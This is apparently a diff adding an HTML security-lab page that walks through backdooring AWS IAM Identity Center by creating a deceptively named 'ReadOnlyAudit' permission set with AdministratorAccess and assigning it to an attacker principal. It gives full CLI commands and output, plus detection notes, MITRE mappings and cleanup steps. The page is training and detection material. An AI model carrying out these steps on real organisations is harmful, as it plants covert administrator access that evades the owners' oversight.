+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>IAM or SSO credentials with the following permissions: <code>sso-admin:CreatePermissionSet</code>, <code>sso-admin:AttachManagedPolicyToPermissionSet</code>, <code>sso-admin:CreateAccountAssignment</code>, <code>sso-admin:ProvisionPermissionSet</code></li>
+      <li>The Identity Center instance ARN and a target account ID</li>
+      <li>An attacker-controlled principal (user or group) ID in the organization's IdentityStore</li>
+      <li>These permissions are typically only held by the management account or delegated Identity Center admin — this scenario represents post-compromise privilege abuse</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Create a new permission set with an innocuous name designed to blend in with legitimate audit or compliance roles.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso-admin create-permission-set \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --name "ReadOnlyAudit" \
+    --description "Read-only audit access for compliance team" \
+    --session-duration "PT12H"</div>
+            <div class="terminal-output">{
+    "PermissionSet": {
+        "Name": "ReadOnlyAudit",
+        "PermissionSetArn": "arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-backdoor00000001",
+        "Description": "Read-only audit access for compliance team",
+        "SessionDuration": "PT12H",
+        "CreatedDate": "2026-04-01T10:30:00.000Z"
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Attach the AdministratorAccess managed policy to the "ReadOnlyAudit" permission set. The name says read-only — the policy says otherwise. This is the deception layer.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso-admin attach-managed-policy-to-permission-set \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-backdoor00000001 \
+    --managed-policy-arn arn:aws:iam::aws:policy/AdministratorAccess</div>
+            <div class="terminal-output">
+# No output on success — HTTP 200</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Assign the backdoor permission set to the attacker's SSO user across the target account. This creates the actual access link.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso-admin create-account-assignment \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --target-id 123456789012 \
+    --target-type AWS_ACCOUNT \
+    --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-backdoor00000001 \
+    --principal-type USER \
+    --principal-id 9067fc82-70b1-7050-e1a3-attacker00001</div>
+            <div class="terminal-output">{
+    "AccountAssignmentCreationStatus": {
+        "Status": "SUCCEEDED",
+        "RequestId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+        "TargetId": "123456789012",
+        "TargetType": "AWS_ACCOUNT",
+        "PermissionSetArn": "arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-backdoor00000001",
+        "PrincipalType": "USER",
+        "PrincipalId": "9067fc82-70b1-7050-e1a3-attacker00001",
+        "CreatedDate": "2026-04-01T10:31:00.000Z"
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Provision the permission set to push the IAM role into the target account. This creates the actual assumable role in the member account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso-admin provision-permission-set \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-backdoor00000001 \
+    --target-type ALL_PROVISIONED_ACCOUNTS</div>
+            <div class="terminal-output">{
+    "PermissionSetProvisioningStatus": {
+        "Status": "SUCCEEDED",
+        "RequestId": "b2c3d4e5-f6a7-8901-bcde-f23456789012",
+        "AccountId": "123456789012",
+        "PermissionSetArn": "arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-backdoor00000001",
+        "CreatedDate": "2026-04-01T10:32:00.000Z"
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Verify persistent access by authenticating through the SSO portal. The backdoor role appears as "ReadOnlyAudit" — hiding in plain sight among legitimate audit roles.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Login through SSO portal — "ReadOnlyAudit" now visible
+$ aws sso get-role-credentials \
+    --role-name ReadOnlyAudit \
+    --account-id 123456789012 \
+    --access-token "eyJhbGciOiJSUzI1NiIs..."</div>
+            <div class="terminal-output">{
+    "roleCredentials": {
+        "accessKeyId": "ASIAIOSFODNN7BACKDOR",
+        "secretAccessKey": "wJalrXUtnFEMI/K7MDENG/BACKDOOREXAMPLE",
+        "sessionToken": "FwoGZXIvYXdzEBYaDH7v8G...(truncated)",
+        "expiration": 1712030400000
+    }
+}</div>
+            <div class="terminal-cmd">$ # Verify: "ReadOnlyAudit" is actually full admin
+$ aws iam list-users --query 'Users[0].UserName'</div>
+            <div class="terminal-output">"admin-user"</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li><strong>Key CloudTrail events:</strong> <code>sso:CreateAccountAssignment</code>, <code>sso-admin:CreatePermissionSet</code>, <code>sso-admin:AttachManagedPolicyToPermissionSet</code>, <code>sso-admin:ProvisionPermissionSet</code></li>
+      <li>Alert on any new permission set creation that is immediately followed by an <code>AttachManagedPolicy</code> for <code>AdministratorAccess</code> or <code>PowerUserAccess</code></li>
+      <li>Alert on <code>CreateAccountAssignment</code> events not correlated with a change ticket or IAC pipeline run</li>
+      <li>Implement SCPs that deny <code>sso-admin:CreatePermissionSet</code> from all principals except the IAC pipeline role</li>
+      <li>Periodic reconciliation: diff the current permission set list and their policies against the known-good Terraform/CloudFormation state</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1136.003 — Create Account: Cloud Account</span>
+      <span class="mitre-tag">T1078.004 — Valid Accounts: Cloud Accounts</span>
+      <span class="mitre-tag">T1098 — Account Manipulation</span>
+      <span class="mitre-tag">T1556 — Modify Authentication Process</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Create Innocuous PermSet</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Attach Admin Policy</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Assign to Attacker</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Provision</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Persistent Org Access</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>Remove all artifacts created during this lab in the following order:</p>
+    <div class="terminal">
+      <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal — Cleanup</div>
+      <div class="terminal-body">
+        <div class="terminal-cmd">$ # 1. Remove the account assignment first
+$ aws sso-admin delete-account-assignment \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --target-id 123456789012 \
+    --target-type AWS_ACCOUNT \
+    --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-backdoor00000001 \
+    --principal-type USER \
+    --principal-id 9067fc82-70b1-7050-e1a3-attacker00001
+
+$ # 2. Detach the policy
+$ aws sso-admin detach-managed-policy-from-permission-set \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-backdoor00000001 \
+    --managed-policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+$ # 3. Delete the permission set
+$ aws sso-admin delete-permission-set \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-backdoor00000001</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> Detection: Monitor CloudTrail for <code>CreatePermissionSet</code>, <code>AttachManagedPolicyToPermissionSet</code>, and <code>CreateAccountAssignment</code> events. Alert on any new permission sets with Admin-level policies that don't match change tickets.
+  </div>
+</div>
